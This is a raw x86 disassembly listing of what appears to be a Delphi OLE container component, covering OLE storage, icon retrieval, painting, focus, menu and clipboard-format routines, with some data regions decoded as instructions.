sub_46e3c0
or al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e559
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46d5b0
cmp [ ebx + 0x25b ] 0x0
je r-xdata
cmp [ ebx + 0x255 ] 0x0
je r-xdata
push ebx
call sub_46e320
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x214 ]
push eax
call GetHGlobalFromILockBytes
call sub_4611a0
lea eax [ ebp - 0x4 ]
call sub_405928
push eax
push 0xffffffff
push 0x0
call CreateILockBytesOnHGlobal
call sub_4611a0
lea eax [ ebp - 0x8 ]
call sub_405928
push eax
push 0x0
push 0x1012
mov eax [ ebp - 0x4 ]
push eax
call StgCreateDocfileOnILockBytes
call sub_4611a0
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
call sub_4611a0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
call sub_4611a0
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetHGlobalFromILockBytes
call sub_4611a0
jmp r-xdata
mov [ ebp - 0x18 ] 0x434f4442
mov eax [ ebx + 0x220 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_43f650
mov ax [ ebp - 0x28 ]
mov [ ebp - 0x18 ] ax
mov ax [ ebp - 0x24 ]
mov [ ebp - 0x16 ] ax
mov ax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0x1c ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
cmp [ ebx + 0x256 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
push eax
call GlobalSize
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0xc
mov eax esi
call sub_41954c
mov eax [ ebp - 0xc ]
push eax
call GlobalLock
xor edx edx
push ebp
push sub_46e534
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
mov ecx [ ebp - 0x10 ]
mov eax esi
call sub_41954c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e53b
mov eax [ ebp - 0xc ]
push eax
call GlobalUnlock
retn
sub_46e58c
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x6c ]
mov edx [ r-xdata ]
call sub_4049a4
xor eax eax
push ebp
push j_sub_403a3c#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x220 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x220 ] 0x1
mov edi 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x220 ] 0x4
mov edi 0x1
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x21c ]
mov ecx r-xdata
call sub_40596c
cmp ebx esi
je r-xdata
cmp esi 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x220 ]
cmp ebx esi
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x4
jne r-xdata
lea eax [ ebp - 0x14 ]
call sub_405928
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
call sub_4611a0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e7cc
lea eax [ ebp - 0x6c ]
mov edx [ r-xdata ]
call sub_404a74
lea eax [ ebp - 0x14 ]
call sub_405928
lea eax [ ebp - 0x10 ]
call sub_405928
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x1
jne r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x30 ]
xor ecx ecx
mov edx 0x14
call sub_402cfc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xffffffff
lea eax [ ebp - 0x18 ]
push eax
push edi
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4611a0
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_46e9a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46ec10
mov eax [ ebp - 0x4 ]
call sub_46ea50
xor eax eax
push ebp
push sub_46e776
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x30 ] 0x3
xor eax eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x4
mov [ ebp - 0x24 ] 0xffffffff
mov [ ebp - 0x20 ] 0x20
mov [ ebp - 0x3c ] 0x20
mov eax [ ebp - 0xc ]
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
push 0x0
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
call sub_4611a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
call sub_46cc94
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x3c ]
call sub_4611a0
push 0xffffffff
push 0x0
lea eax [ ebp - 0x4c ]
push eax
call OleGetIconOfClass
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
push 0x0
lea eax [ ebp - 0x6c ]
mov edx [ r-xdata ]
call sub_404a74
push eax
push 0x1
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
je r-xdata
cmp ebx [ ebp - 0x64 ]
jne r-xdata
mov eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
sub_46e7e4
push ebx
add esp 0xfffffff0
mov ebx eax
cmp dl [ ebx + 0x25c ]
je r-xdata
add esp 0x10
pop ebx
retn
mov [ ebx + 0x25c ] dl
push 0x0
push 0x0
mov eax ebx
call sub_4464d0
push eax
call GetUpdateRect
test eax eax
je r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax ebx
call sub_46d940
neg eax
push eax
mov eax ebx
call sub_46d940
neg eax
push eax
lea eax [ esp + 0x8 ]
push eax
call InflateRect
mov edx esp
mov eax [ ebx + 0x208 ]
call sub_420fdc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_46e850
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_46d970
cmp bl al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_46d5b0
xor ecx ecx
mov edx ebx
mov eax esi
call sub_46e58c
sub_46e89c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403788
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x259 ] bl
mov eax [ ebp - 0x4 ]
call sub_456c04
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ esi + 0x27c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
mov eax [ esi + 0x220 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
xor eax eax
mov [ esi + 0x27c ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x27c ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x262 ] 0x0
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d6c0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x26a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call SetFocus
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_440e64
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_46e9a4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46ea32
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405928
push eax
push r-xdata
mov eax [ esi + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ea39
lea eax [ ebp - 0x8 ]
call sub_405928
lea eax [ ebp - 0x4 ]
call sub_405928
retn
test bl bl
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_405928
lea eax [ ebp - 0x8 ]
mov edx esi
test edx edx
je r-xdata
call sub_405940
jmp r-xdata
sub edx 0xfffffd70
mov eax [ ebp - 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x220 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_46ea50
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x21c ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x34 ]
call sub_4611a0
mov eax ebx
mov si 0xffb3
call sub_4034e4
sub_46ea7c
push ebx
add esp 0xffffffd0
mov ebx eax
cmp [ ebx + 0x284 ] 0x0
je r-xdata
lea edx [ esp + 0x28 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea edx [ esp + 0x28 ]
mov ecx esp
mov eax [ ebx + 0x30 ]
call sub_43f7f4
mov eax ebx
call sub_43f6f8
add eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov eax ebx
call sub_43f6b4
mov ecx eax
add ecx [ esp + 0x8 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
call sub_41613c
cmp [ ebx + 0x23c ] 0x0
je r-xdata
cmp [ ebx + 0x280 ] 0x0
je r-xdata
add esp 0x30
pop ebx
retn
push 0x3fff
lea eax [ esp + 0x1c ]
push eax
mov ecx 0x3fff
mov edx 0xffffc000
mov eax 0xffffc000
call sub_41613c
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov eax [ ebx + 0x23c ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
lea edx [ esp + 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x18 ]
push eax
mov eax [ ebx + 0x280 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
jmp r-xdata
sub_46eb3c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
lea esi [ ebp - 0x18 ]
xor eax eax
push ebp
push sub_46ec01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46d5b0
mov eax ebx
call sub_46d82c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x22c ] eax
lea eax [ ebp - 0x4 ]
call sub_405928
push eax
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x30 ]
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ec08
lea eax [ ebp - 0x1c ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_405928
retn
jmp r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
jl r-xdata
test [ esi + 0xc ] 0x2
jne r-xdata
mov ax [ esi ]
mov [ ebp - 0x8 ] ax
mov ax [ esi + 0x8 ]
mov [ ebp - 0x6 ] ax
lea eax [ ebp - 0x1c ]
mov edx [ esi + 0x4 ]
call sub_404260
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebx + 0x22c ]
mov edi [ eax ]
call [ edi + 0x3c ]
sub_46ec10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46ec93
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405928
push eax
push r-xdata
mov eax [ ebx + 0x21c ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_414a84
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffb3
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ec9a
lea eax [ ebp - 0x4 ]
call sub_405928
retn
lea eax [ ebx + 0x224 ]
push eax
push 0x0
push 0xffffffff
mov eax [ ebx + 0x220 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
mov eax ebx
call sub_46d55c
sub_46ec9f
add [ edi ] ah
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_445ab0
pop esi
pop ebx
retn
cmp [ ebx + 0x254 ] 0x1
jne r-xdata
mov eax ebx
call sub_46d55c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46ece4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x234 ]
mov edx [ eax ]
call [ edx + 0x48 ]
call sub_46ce00
test al al
je r-xdata
mov eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x238 ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
mov eax [ ebx + 0x238 ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_46ed40
push ebx
mov ebx eax
mov eax ebx
call sub_456c04
cmp ebx [ eax + 0x27c ]
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax [ ebx + 0x23c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_46ed84
push ebx
push ecx
mov ebx eax
mov eax ebx
call sub_444bcc
cmp [ ebx + 0x259 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
call sub_46e7e4
pop edx
pop ebx
retn
push esp
mov eax [ ebx + 0x23c ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov eax [ esp ]
push eax
call SetFocus
pop edx
pop ebx
retn
sub_46edc4
push ebx
mov ebx eax
mov eax ebx
call sub_444a84
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp [ ebx + 0x284 ] 0x0
je r-xdata
cmp [ ebx + 0x27a ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x259 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x27c ]
call [ ebx + 0x278 ]
pop ebx
retn
sub_46ee08
push ebx
push esi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_43f650
mov edx esi
mov eax ebx
call sub_444974
cmp [ ebx + 0x259 ] 0x0
je r-xdata
add esp 0x20
pop esi
pop ebx
retn
push esp
lea edx [ esp + 0x14 ]
mov eax ebx
call sub_43f650
lea eax [ esp + 0x14 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov eax ebx
call sub_46ea7c
sub_46ee54
push ebx
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_417570
call sub_46d6e8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_46ef14
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ esi + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp + 0xc ]
push esi
lea esi [ ebp - 0x18 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ esi + 0xc ]
call sub_4431c8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_46f40c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0xc ]
call sub_44318c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_46f420
test al al
jne r-xdata
mov al [ ebx + 0x5b ]
dec al
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebx + 0x4c ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebx + 0x4c ]
sub [ eax + 0xc ] edx
dec al
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebx + 0x48 ]
add [ eax ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebx + 0x48 ]
sub [ eax + 0x8 ] edx
jmp r-xdata
jmp r-xdata
sub_46efd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax ebx
call sub_4431c8
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x22f ] 0x2
je r-xdata
mov [ ebp - 0x4 ] 0x800401a1
inc eax
mov ebx eax
xor edi edi
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc edi
dec ebx
jne r-xdata
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ esi + 0xc ]
mov edx edi
call sub_44318c
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_46f040
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push eax
push esi
call sub_46efd4
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
call sub_442d30
mov eax [ esi + 0xc ]
call sub_4431c8
dec eax
test eax eax
jl r-xdata
xor ebx ebx
mov eax rw-data
mov [ ebp - 0xc ] eax
inc eax
mov [ ebp - 0x8 ] eax
xor ebx ebx
inc ebx
inc [ ebp - 0xc ]
cmp ebx 0x4
jne r-xdata
mov edi [ esi + ebx * 4 + 0x24 ]
test edi edi
jne r-xdata
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43fbd0
mov edx edi
mov eax [ esi + 0x20 ]
call sub_417414
mov eax [ ebp + 0xc ]
mov eax [ eax + ebx * 4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov eax [ esi + 0xc ]
call sub_442d38
xor eax eax
test bl 0x1
je r-xdata
mov ecx [ esi + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43edb0
mov edi eax
cmp ebx 0x2
jge r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_44318c
mov edi eax
mov edx edi
mov eax esi
call sub_46f420
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43f46c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43f490
jmp r-xdata
mov eax 0xffffd8f0
mov eax 0x2710
jmp r-xdata
mov edx eax
mov eax edi
call sub_43f420
mov edx eax
mov eax edi
call sub_43f444
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ ebp - 0xc ]
mov dl [ eax ]
mov eax edi
call sub_43f1c4
mov edx [ esi + 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ esi + ebx * 4 + 0x24 ] edi
sub_46f26c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
jmp r-xdata
push ebx
call GetMenuItemCount
test eax eax
jg r-xdata
push 0x400
push 0x0
push ebx
call RemoveMenu
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_46f2c0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
mov eax 0x1
mov dx [ ebp + 0x10 ]
mov eax ebx
call sub_452f80
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_46f2f4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
mov [ edi + 0xc ] esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ edi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ edi + 0x20 ] eax
mov eax [ edi + 0xc ]
add eax 0x264
mov edx edi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_40360c
call sub_405940
mov eax edi
test bl bl
je r-xdata
sub edx 0xffffffc8
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_46f364
push ebx
push esi
push edi
call sub_403674
mov ebx edx
mov edi eax
mov esi [ edi + 0xc ]
test esi esi
je r-xdata
mov eax [ edi + 0x20 ]
call sub_4032e8
mov eax [ edi + 0x10 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4032d8
test bl bl
jle r-xdata
lea eax [ esi + 0x264 ]
call sub_405928
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40365c
sub_46f3b0
push ebx
push esi
push edi
mov esi eax
mov eax [ esi + 0xc ]
call sub_442d30
xor ebx ebx
mov eax [ esi + ebx * 4 + 0x24 ]
call sub_4032e8
xor eax eax
mov [ esi + ebx * 4 + 0x24 ] eax
inc ebx
cmp ebx 0x4
jne r-xdata
mov eax [ esi + 0x20 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ esi + 0x20 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esi + 0xc ]
call sub_442d38
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_417570
mov dl 0x1
call sub_43fbd0
inc ebx
dec edi
jne r-xdata
sub_46f420
push ebx
mov ebx edx
cmp [ ebx + 0x57 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x5b ]
dec eax
sub al 0x4
jae r-xdata
push 0x0
xor ecx ecx
mov edx 0xb032
mov eax ebx
call sub_440e64
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_46f46c
push ebx
push esi
mov esi rw-data
push 0x0
call GetDC
mov ebx eax
push 0x58
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] eax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] eax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] eax
mov ax [ rw-data ]
mov [ esi ] ax
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] 0xffffffff
mov [ esi + 0x10 ] 0x8
mov ax [ rw-data ]
mov [ esi + 0x14 ] ax
mov [ esi + 0x1c ] 0x1
mov [ esi + 0x20 ] 0xffffffff
mov [ esi + 0x24 ] 0x1
pop esi
pop ebx
retn
sub_46f53c
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403a3c#3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f56f
retn
call OleUninitialize
sub_46f590
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
inc esi
add ah cl
test [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
clc
inc esi
add [ ebx + eax ] al
add ah al
push ebp
inc ebp
add [ eax ] cl
fadd [ ecx ]
in al dx
add [ ebp ] r-xdata
inc esp
xor eax 0xa80c0040
inc ebp
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
or [ ebp + eax * 2 + 0x446fa400 ] al
add [ eax - 0x77 ] bh
inc ebp
add [ ebx + edi * 2 ] dl
inc ecx
add al cl
test [ ebp ] eax
add al 0x86
inc ebp
add [ eax ] dl
xchg [ ebp ] eax
cwde
cli
inc ebx
add [ eax ] ah
fadd [ ecx ]
mov [ edi - 0x2affffbb ] cl
inc ecx
add [ eax ] ch

sub_46f63a
inc ebx
add [ esp + edi * 8 ] cl
inc ebx
add [ eax - 0x71 ] dl
inc ebp
add [ esi + ecx * 4 ] bl
inc ebp
add [ ebp + edi * 8 + 0x43 ] al
add al cl
pop [ ebp ]
in al dx
pop ds
inc esp
add [ ebx ] al
inc esp
add al al
arpl [ eax + eax - 0x7c ] ax
pop esi
inc esp
add [ ebx + 0x7f600044 ] ah
inc ebp
add [ esi + edx * 4 + 0x45 ] ch
add [ eax ] bh
cmp [ eax + eax + 0x30 ] eax
mov [ 0xffffffffa6900045 ] eax
inc ebp
add [ ebp + 0x45 ] cl
add al dl
cmp [ eax + eax - 0x2c ] eax
cmp [ eax + eax - 0x38 ] eax
cmpsd [ esi ] [ edi ]
inc ebp
add [ eax + edi ] dh
inc esp
add ah ah
inc esp
add [ esi + ebp * 4 + 0x76740045 ] bh
inc esp
add [ eax ] ch
popad
inc esp
add al dl
retn
sub_46f69e
inc ebp
add [ ecx + edi * 2 + 0x45 ] dl
add [ esp + edi * 2 ] al
inc ebp
add [ eax - 0x13ffba4c ] dh
test [ ebp ] al
push 0xb0004585
mov [ ebp ] sub_458224
mov ah 0xc2
inc ebp
add [ ecx + ebp * 4 - 0x3b97ffbb ] dl
inc ebp
add [ edi + ecx * 4 + 0x45 ] cl
add [ ebx ] dl
add [ ecx ] bl
clc
inc esi
add al bh
add al [ eax ]
add [ eax ] al
add [ edi ] al
push ebp
jo r-xdata
add [ eax ] al
add eax 0x6f430900
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
outsd
ja r-xdata
or eax [ ecx + 0x63 ]
je r-xdata
adc [ ebx ] al
add [ eax ] al
push es
add al 0x0
xor esp edi
add al [ eax ]
add [ ecx ] al
add [ eax ] cl
inc ecx
outsb
imul ebp [ ebp + 0x61 ] 0x316574
add eax [ eax ]
add [ edx ] al
add [ eax + edx * 2 ] cl
jb r-xdata
jb r-xdata
outsd
add [ eax + eax ] cl
je r-xdata
popad
sbb al 0x3
add [ eax ] al
or [ eax ] al
jae r-xdata
jb r-xdata
push esi
inc ebx
add [ edi + esi * 4 - 0x3dc3ffbc ] bh
outsb
je r-xdata
add [ edi ] cl
add [ ebx + eax * 2 ] cl
outsd
insb
outsd
jb r-xdata
imul ebp [ esi + 0x65 ] 0x3283172
add [ eax ] al
or al [ eax ]
or [ eax + 0x61 ] edx
imul ebp [ esi + 0x74 ] 0x31786f42
sub al 0x3
add [ eax ] al
or eax [ eax ]
push cs
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
xor [ eax ] esi
